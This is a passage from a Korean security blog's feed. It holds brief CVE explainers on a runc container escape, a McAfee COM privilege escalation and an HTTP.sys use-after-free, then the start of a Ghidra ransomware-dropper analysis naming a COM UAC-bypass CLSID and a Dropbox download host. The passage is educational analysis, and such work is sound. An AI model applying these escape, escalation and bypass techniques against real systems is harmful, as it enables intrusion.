&#xB9C8;&#xC6B4;&#xD2B8; &#xB418;&#xB3C4;&#xB85D; &#xD560; &#xC218; &#xC788;&#xB294; escape &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCEE8;&#xD14C;&#xC774;&#xB108;&#xAC00; &#xC2DC;&#xC791;&#xB418;&#xACE0; runc&#xAC00; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xACF5;&#xC720; &#xBCFC;&#xB968; &#xB0B4;&#xBD80;&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8; &#xB418;&#xB294; &#xACBD;&#xC6B0; runc&#xB294; &#xB9C8;&#xC6B4;&#xD2B8; &#xB418;&#xB294; &#xB300;&#xC0C1;&#xC744; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xB9C8;&#xC6B4;&#xD2B8; &#xB300;&#xC0C1;&#xC744; &#xCEE8;&#xD14C;&#xC774;&#xB108; rootfs &#xC678;&#xBD80;&#xC758; &#xD638;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xBA74; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; escape &#xD574; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC778; &#xACBD;&#xC6B0; <code>MS_SLAVE</code> &#xC804;&#xD30C; &#xD0C0;&#xC785;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xB9C8;&#xC6B4;&#xD2B8; &#xB124;&#xC784;&#xC2A4;&#xD398;&#xC774;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; Kubernetes&#xC640; &#xAC19;&#xC774; &#xBCFC;&#xB968; &#xAD00;&#xB9AC; &#xC778;&#xD504;&#xB77C;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xB294; &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xBCFC;&#xB968; &#xAD00;&#xB9AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB85C; &#xC811;&#xADFC;</li><li>&#xB9C8;&#xC6B4;&#xD2B8; &#xC18C;&#xC2A4; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xD638;&#xC2A4;&#xD2B8;&#xC758; <code>/</code> &#xC5D0; &#xB300;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC2E4;&#xD589;</li><li>&#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC758; &#xD6C4;&#xC18D; &#xB9C8;&#xC6B4;&#xD2B8;&#xC5D0;&#xC11C; toctou&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; <code>/</code> &#xB97C; &#xB9C8;&#xC6B4;&#xD2B8;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>escape</tag>
      
      <tag>docker</tag>
      
      <tag>L0ch</tag>
      
      <tag>vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-23874: McAfee COM-objects 권한 상승 취약점</title>
    <link href="/2021/05/20/idioth/2021-05-20/"/>
    <url>/2021/05/20/idioth/2021-05-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://the-deniss.github.io/posts/2021/05/17/discovering-and-exploiting-mcafee-com-objects.html">Discovering and exploiting McAfee COM-objects (CVE-2021-23874)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee Total Protection 16.0.30 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee&#xC758; &#xD50C;&#xB798;&#xADF8;&#xC2ED; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xC81C;&#xD488; McAfee Total Protection&#xC758; COM &#xAC1D;&#xCCB4;&#xC5D0;&#xC11C; local privilege escalation&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>McAWFwk &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; <code>CoInitializeSecurity</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C; <code>pSecDesc</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xB110; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xBA70; <code>dwCapabilities</code>&#xC758; &#xAC12;&#xC740; 0&#xC785;&#xB2C8;&#xB2E4;. <code>dwCapabilities</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; <code>EOAC_AAPID</code>&#xB098; <code>EOAC_ACCESS_CONTROL</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;, <code>CoInitializeSecurity</code>&#xB294; <code>pSecDesc</code>&#xB97C; &#xC561;&#xC138;&#xC2A4; &#xAC80;&#xC0AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC778;&#xC2DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>pSecDesc</code>&#xAC00; &#xB110; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xBBC0;&#xB85C; ACL &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC2DC;&#xC791; &#xC2DC; <code>IMcClassFactory</code>&#xB97C; &#xD1B5;&#xD574; <code>CoManageOem Class</code> &#xAC1D;&#xCCB4;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xACE0; <code>IMcClassFactory::InternalCreateObject</code>&#xB97C; &#xD1B5;&#xD574; &#xAC1D;&#xCCB4;&#xB97C; &#xBC18;&#xD658; &#xBC1B;&#xC544; <code>ImanageOem::RunProgram</code>&#xC744; &#xD1B5;&#xD574; <code>NT Authority\System</code> &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; COM &#xAC1D;&#xCCB4;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xB54C; ProxyStub DLL&#xC5D0; self-defense &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; PEB &#xAD6C;&#xC870;&#xB97C; &#xC218;&#xC815;&#xD558;&#xC5EC; <code>ValidateModule</code> &#xD568;&#xC218;&#xC758; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC2DC; &#xD504;&#xB85D;&#xC2DC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBAA8;&#xB4C8;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC2A4;&#xD478;&#xD551;&#xD558;&#xC5EC; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xAC80;&#xC0AC;&#xAC00; &#xC218;&#xD589;&#xB418;&#xAE30; &#xC804;&#xC5D0; McAfee&#xC758; &#xC11C;&#xBA85;&#xC774; &#xB41C; &#xC544;&#xBB34; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xACBD;&#xB85C;&#xB97C; <code>MasqueradeImagePath</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>mcafee</tag>
      
      <tag>idioth</tag>
      
      <tag>com</tag>
      
      <tag>arbitrary process execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31166: HTTP.sys 원격 코드 실행 취약점</title>
    <link href="/2021/05/19/fabu1ous/2021-05-19/"/>
    <url>/2021/05/19/fabu1ous/2021-05-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/17/cve-2021-31166-a-wormable-code-execution-bug-in-httpsys">A WORMABLE CODE EXECUTION BUG IN HTTP.SYS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10</p><p>Windows server 2004</p><p>Windows server 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84; Http.sys&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC6F9;&#xC11C;&#xBC84; IIS(Internet Information services) Windows Server&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Http.sys&#xB294; http request &#xD30C;&#xC2F1; &#xBC0F; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB85C; &#xBCF4;&#xB0BC; response &#xC0DD;&#xC131;&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Http request header <code>Accept-Encoding</code>&#xC744; &#xD30C;&#xC2F1; &#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC758; &#xC124;&#xACC4; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294;  <code>Accept-Encoding</code> header&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC6F9;&#xC11C;&#xBC84;&#xC5D0;&#xAC8C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xB370;&#xC774;&#xD130; &#xC555;&#xCD95; &#xBC29;&#xC2DD;&#xC744; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC6F9;&#xC11C;&#xBC84;&#xB294; &#xC804;&#xB2EC;&#xBC1B;&#xC740;  <code>Accept-Encodeing</code>&#xC758; &#xD544;&#xB4DC; &#xAC12;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xACE0; unknown, supported, invalid&#xB85C; &#xAD6C;&#xBD84;&#xD574; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. unknown&#xC758; &#xACBD;&#xC6B0; &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0;, &#xD30C;&#xC2F1;&#xC774; &#xB05D;&#xB098; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xAC00; &#xC644;&#xC131;&#xB418;&#xBA74; &#xC2A4;&#xD0DD; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xAE30;&#xC874; root &#xB178;&#xB4DC;&#xB97C; &#xBC84;&#xB9AC;&#xACE0; internal structure &#xC18D; root &#xB178;&#xB4DC;&#xB85C; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC62E;&#xAE30;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAE30;&#xC874; root &#xB178;&#xB4DC;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xC5EC;&#xC804;&#xD788; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; use-after-free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; &#xC545;&#xC131; HTTP request&#xB97C; &#xC6D0;&#xACA9; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBCF4;&#xB0B4; Kernel &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>wormable</tag>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</title>
    <link href="/2021/05/19/idioth/ghidra_part4/"/>
    <url>/2021/05/19/idioth/ghidra_part4/</url>
    
    <content type="html"><![CDATA[<p><strong>&#xB2E4;&#xB978; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 3 - tips for IDA User (Here!)</a></p><p>Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 4 - Malware Analysis (1) (Here!)</p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 5 - Malware Analysis (2)</a></p><hr><p>&#xBC18;&#xAC11;&#xC2B5;&#xB2C8;&#xB2E4;. 3&#xC77C; &#xB9CC;&#xC5D0; &#xBD59;&#xB294;&#xAD70;&#xC694;. &#xC77C;&#xC694;&#xC77C; &#xBC88;&#xC5ED; &#xAE00;&#xC5D0;&#xC11C; &#xB9D0;&#xC500; &#xB4DC;&#xB838;&#xB2E4;&#xC2DC;&#xD53C; ghidra &#xAE00;&#xC744; &#xBE60;&#xB974;&#xAC8C;(?) &#xC791;&#xC131;&#xC744; &#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4;&#xC0C1; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xC810;&#xC740; &#xC544; &#xC774;&#xAC70; &#xC77C;&#xC77C;&#xC774; &#xB2E4; &#xC138;&#xC138;&#xD558;&#xAC8C; &#xD558;&#xBA74; &#xBB54;&#xAC00; &#xC8FC;&#xAC1D;&#xC774; &#xC804;&#xB3C4;&#xB418;&#xB294; &#xAC70; &#xAC19;&#xC740;&#xB370;&#x2026; ghidra &#xAE00;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC5D0; &#xCD08;&#xC810;&#xC774; &#xB9DE;&#xCDB0;&#xC9C0;&#xB294; &#xAC70; &#xC544;&#xB2CC;&#xAC00;? <del>&#xD2C0;&#xB9B0; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC5B4;&#xB5A1;&#xD558;&#xC9C0;</del>&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xAC00;&#xBCCD;&#xAC8C; &#xC5B4;&#xB5A0;&#xD55C; &#xC2DD;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xAE30; &#xD3B8;&#xD558;&#xAC8C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;! &#xC911;&#xC810;&#xC73C;&#xB85C; &#xB2E4;&#xB8F0; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCFC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; ataware &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#x2192; ATAPIinit &#x2192; ATAPIConfiguration &#x2192; ATAPIUpdtr &#xC21C;&#xC73C;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB4DC;&#xB86D;&#xD558;&#xACE0; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xAE00;&#xC740; ghidra&#xC5D0; &#xAD00;&#xB828;&#xB41C; &#xAE00;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB4A4;&#xC5D0; &#xC138; &#xAC1C;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C;&#xB294; ATAPinit&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB8E8;&#xC5B4; &#xBD05;&#xC2DC;&#xB2E4;!</p><h1 id="ghidra&#xB97C;-&#xD1B5;&#xD574;-&#xBD84;&#xC11D;-&#xACE0;&#xACE0;"><a href="#ghidra&#xB97C;-&#xD1B5;&#xD574;-&#xBD84;&#xC11D;-&#xACE0;&#xACE0;" class="headerlink" title="ghidra&#xB97C; &#xD1B5;&#xD574; &#xBD84;&#xC11D; &#xACE0;&#xACE0;"></a>ghidra&#xB97C; &#xD1B5;&#xD574; &#xBD84;&#xC11D; &#xACE0;&#xACE0;</h1><p>ATAPIinit &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <a href="https://app.any.run/tasks/e8e682e8-6d7f-42c8-ad3f-6afa980a77e3/">app.any.run</a>&#xC5D0;&#xC11C; &#xBC1B;&#xC73C;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xC704;&#xD574; Detect It Easy&#xC5D0; ATAPinit&#xC744; &#xB123;&#xC5B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled.png" alt></p><p>MinGW&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, 32&#xBE44;&#xD2B8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB124;&#xC694;.</p><p>&#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD655;&#xC778;&#xC744; &#xD574;&#xC11C; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xB300;&#xAC15; &#xC720;&#xCD94;&#xB97C; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. PEStudio&#xB85C; &#xD655;&#xC778;&#xC744; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%201.png" alt></p><p>&#xB208;&#xC5D0; &#xB744;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC740; <code>Elevation:Administrator!new:</code>, <code>CLSIDFromString</code>, <code>{6EDD6D74-C007-4E75-B76A-E5740995E24C}</code>, <code>dl.dropboxusercontent.com</code>&#xC815;&#xB3C4; &#xC785;&#xB2C8;&#xB2E4;.</p><p><code>{6EDD6D74-C007-4E75-B76A-E5740995E24C}</code>&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xAD6C;&#xAE00;&#xC5D0; &#xAC80;&#xC0C9;&#xC744; &#xD574;&#xBCF8; &#xACB0;&#xACFC; COM Interface&#xB97C; &#xD1B5;&#xD574; UAC bypass&#xB97C; &#xD558;&#xB294; &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB098;&#xC624;&#xB124;&#xC694;. <code>Elevation:Administarator!new:</code>&#xC640; &#xC5F0;&#xACC4;&#xD588;&#xC744; &#xB54C; COM&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD55C; &#xD6C4;, <code>dl.dropboxusercontent.com</code> &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574; ATAPIConfiguration&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C;&#xB2E4;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%202.png" alt></p><p>&#xC557;! &#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB300;&#xCDA9; &#xC5B4;&#xB5A4; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC558;&#xC73C;&#xB2C8; ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBD05;&#xC2DC;&#xB2E4;. &#x1F642;</p><p>&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; Variable/Function rename, Data type Redefine, Redefine Function Signature &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC880; &#xB354; &#xBCF4;&#xAE30; &#xD3B8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xC694;!</p><p>&#xBA3C;&#xC800; &#xC0C8; &#xD504;&#xB85C;&#xC81D;&#xD2B8;(&#xC800;&#xC758; &#xACBD;&#xC6B0; ataware&#xB85C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.)&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; ATAPIinit&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xC5F4;&#xC5B4;&#xC11C; analysis&#xB97C; &#xD569;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%203.png" alt></p><h2 id="UAC-Bypass-&#xD568;&#xC218;"><a href="#UAC-Bypass-&#xD568;&#xC218;" class="headerlink" title="UAC Bypass &#xD568;&#xC218;"></a>UAC Bypass &#xD568;&#xC218;</h2><p>Aggressive Instruction Finder&#xB294; &#xCCB4;&#xD06C;&#xAC00; &#xD480;&#xB824;&#xC788;&#xC73C;&#xB2C8; &#xCCB4;&#xD06C;&#xB97C; &#xD558;&#xACE0; Analyze&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%204.png" alt></p><p><code>entry</code>&#xC5D0;&#xC11C; <code>FUN_00401570</code>&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C;(?) &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCFC; &#xACC4;&#xD68D;&#xC785;&#xB2C8;&#xB2E4;. &#xD074;&#xB9AD;&#xC744; &#xD574;&#xC11C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  FUN_0040da90();  DAT_00416020 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  DAT_00416024 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  FUN_00401657(<span class="hljs-number">0</span>);  FUN_004017e4();  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>&#xADF8;&#xC911;&#xC5D0;&#xC11C; &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; &#xBD80;&#xBD84;&#xC778; COM&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; UAC&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;! <code>FUN_004017e4()</code>&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C; &#xB4E4;&#xC5B4;&#xAC14;&#xC744; &#xB54C;, &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0;&#xC11C; &#xB098;&#xC624;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004017e4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  HMODULE pHVar1;  <span class="hljs-keyword">int</span> iVar2;  undefined *puVar3;  <span class="hljs-keyword">int</span> **ppiVar4;  <span class="hljs-keyword">wchar_t</span> local_27c [<span class="hljs-number">260</span>];  undefined4 local_74 [<span class="hljs-number">5</span>];  undefined4 local_60;  <span class="hljs-keyword">int</span> *local_50;  undefined local_4c [<span class="hljs-number">16</span>];  